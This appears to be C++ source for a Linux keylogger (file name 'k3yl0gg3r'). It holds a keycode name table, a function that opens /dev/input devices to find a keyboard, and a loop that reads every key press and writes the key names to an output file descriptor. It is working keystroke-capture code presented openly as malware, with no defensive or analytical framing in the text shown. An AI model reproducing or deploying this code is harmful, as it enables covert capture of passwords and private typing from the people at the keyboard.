#include "k3yl0gg3r.h"

#include <csignal>
#include <cstring>
#include <filesystem>
#include <iostream>
#include <fcntl.h>
#include <cerrno>
#include <sys/stat.h>
#include <linux/input.h>
#include <cstring>
#include <fstream>
#include <unistd.h>
#include <iostream>
#include "h3lp3r.h"

std::vector<std::string> keycodes = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK",
    "KP7",
    "KP8",
    "KP9",
    "KPMINUS",
    "KP4",
    "KP5",
    "KP6",
    "KPPLUS",
    "KP1",
    "KP2",
    "KP3",
    "KP0",
    "KPDOT",
    "ZENKAKUHANKAKU",
    "102ND",
    "F11",
    "F12",
    "RO",
    "KATAKANA",
    "HIRAGANA",
    "HENKAN",
    "KATAKANAHIRAGANA",
    "MUHENKAN",
    "KPJPCOMMA",
    "KPENTER",
    "RIGHTCTRL",
    "KPSLASH",
    "SYSRQ",
    "RIGHTALT",
    "LINEFEED",
    "HOME",
    "UP",
    "PAGEUP",
    "LEFT",
    "RIGHT",
    "END",
    "DOWN",
    "PAGEDOWN",
    "INSERT",
    "DELETE",
    "MACRO",
    "MUTE",
    "VOLUMEDOWN",
    "VOLUMEUP",
    "POWER",
    "KPEQUAL",
    "KPPLUSMINUS",
    "PAUSE",
    "SCALE",
    "KPCOMMA",
    "HANGEUL",
    "HANGUEL",
    "HANJA",
    "YEN",
    "LEFTMETA",
    "RIGHTMETA",
    "COMPOSE",
    "STOP",
    "AGAIN",
    "PROPS",
    "UNDO",
    "FRONT",
    "COPY",
    "OPEN",
    "PASTE",
    "FIND",
    "CUT",
    "HELP",
    "MENU",
    "CALC",
    "SETUP",
    "SLEEP",
    "WAKEUP",
    "FILE",
    "SENDFILE",
    "DELETEFILE",
    "XFER",
    "PROG1",
    "PROG2",
    "WWW",
    "MSDOS",
    "COFFEE",
    "SCREENLOCK",
    "ROTATE_DISPLAY",
    "DIRECTION",
    "CYCLEWINDOWS",
    "MAIL",
    "BOOKMARKS",
    "COMPUTER",
    "BACK",
    "FORWARD",
    "CLOSECD",
    "EJECTCD",
    "EJECTCLOSECD",
    "NEXTSONG",
    "PLAYPAUSE",
    "PREVIOUSSONG",
    "STOPCD",
    "RECORD",
    "REWIND",
    "PHONE",
    "ISO",
    "CONFIG",
    "HOMEPAGE",
    "REFRESH",
    "EXIT",
    "MOVE",
    "EDIT",
    "SCROLLUP",
    "SCROLLDOWN",
    "KPLEFTPAREN",
    "KPRIGHTPAREN",
    "NEW",
    "REDO",
    "F13",
    "F14",
    "F15",
    "F16",
    "F17",
    "F18",
    "F19",
    "F20",
    "F21",
    "F22",
    "F23",
    "F24",
    "PLAYCD",
    "PAUSECD",
    "PROG3",
    "PROG4",
    "ALL_APPLICATIONS",
    "DASHBOARD",
    "SUSPEND",
    "CLOSE",
    "PLAY",
    "FASTFORWARD",
    "BASSBOOST",
    "PRINT",
    "HP",
    "CAMERA",
    "SOUND",
    "QUESTION",
    "EMAIL",
    "CHAT",
    "SEARCH",
    "CONNECT",
    "FINANCE",
    "SPORT",
    "SHOP",
    "ALTERASE",
    "CANCEL",
    "BRIGHTNESSDOWN",
    "BRIGHTNESSUP",
    "MEDIA",
    "SWITCHVIDEOMODE",
    "KBDILLUMTOGGLE",
    "KBDILLUMDOWN",
    "KBDILLUMUP",
    "SEND",
    "REPLY",
    "FORWARDMAIL",
    "SAVE",
    "DOCUMENTS",
    "BATTERY",
    "BLUETOOTH",
    "WLAN",
    "UWB",
    "UNKNOWN",
    "VIDEO_NEXT",
    "VIDEO_PREV",
    "BRIGHTNESS_CYCLE",
    "BRIGHTNESS_AUTO",
    "BRIGHTNESS_ZERO",
    "DISPLAY_OFF",
    "WWAN",
    "WIMAX",
    "RFKILL",
    "MICMUTE"
};

void keylogger(const int keyboard, const int writeout) {
    std::cout << "Started logging" << std::endl;
    size_t eventSize = sizeof(struct input_event);
    size_t bytesRead = 0;
    constexpr unsigned int numEvents = 250;
    struct input_event events[numEvents];

    signal(SIGINT, sigintHandler);

    while (loop) {
        bytesRead = read(keyboard, events, eventSize * numEvents);
        for (int i = 0; i < (bytesRead / eventSize); ++i) {
            if (events[i].type == EV_KEY) {
                if (events[i].value == 1) {
                    if (events[i].code > 0 && events[i].code < keycodes.size()) {
                        const char* toWrite = keycodes[events[i].code].c_str();
                        if (toWrite == std::string("SPACE")) {
                            safeWriteAll(writeout, " ", keyboard);
                        } else {
                            safeWriteAll(writeout, keycodes[events[i].code].c_str(), keyboard);
                        }
                    } else {
                        write(writeout, "UNKNOWN", sizeof("UNKNOWN"));
                    }
                }
            }
        }
    }
    std::cout << "Ended logging" << std::endl;
}

std::string getKeyboardDevice() {
    std::string keyboard;
    for (auto&p: std::filesystem::directory_iterator("/dev/input/")) {
        if (std::filesystem::is_character_file(std::filesystem::status(p))) {
            std::string filename = p.path().string();
            const int fd = open(filename.c_str(), O_RDONLY);
            if (fd == -1) {
                std::cerr << "Error from keylogger: " << strerror(errno) << std::endl;
                continue;
            }

            int32_t eventBitmap = 0;
            constexpr int32_t keyboardBitmap = KEY_A | KEY_B | KEY_C | KEY_Z;

            ioctl(fd, EVIOCGBIT(0, sizeof(eventBitmap)), &eventBitmap);
            if ((EV_KEY & eventBitmap) == EV_KEY) {
                ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(eventBitmap)), &eventBitmap);
                if ((keyboardBitmap & eventBitmap) == keyboardBitmap) {
                    keyboard = filename;
                    close(fd);
                    break;
                }
            }
            close(fd);
        }
    }
    return keyboard;
}
